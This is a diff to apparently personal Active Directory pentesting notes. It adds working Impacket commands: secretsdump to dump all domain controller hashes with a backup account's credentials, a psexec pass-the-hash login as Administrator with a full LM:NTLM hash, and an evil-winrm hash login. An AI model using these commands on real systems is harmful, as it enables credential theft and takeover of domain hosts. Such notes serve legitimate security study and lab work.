@@ -1,12 +1,15 @@
 # Active Directory Exploitation  
 ## NTLM Authentication
 ### Impacket Scripts 
+### Impacket Scripts  
+psexec.py, smbexec.py, wmiexec.py   
 If you have creds for the backup account for domain controller: can dump all hashes    
 
     python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
     
-Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't neeed to be cracked)    
+Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't need to be cracked)    
 
+    python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183    
     evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]  
 
 ## Kerberos (Port 88)   
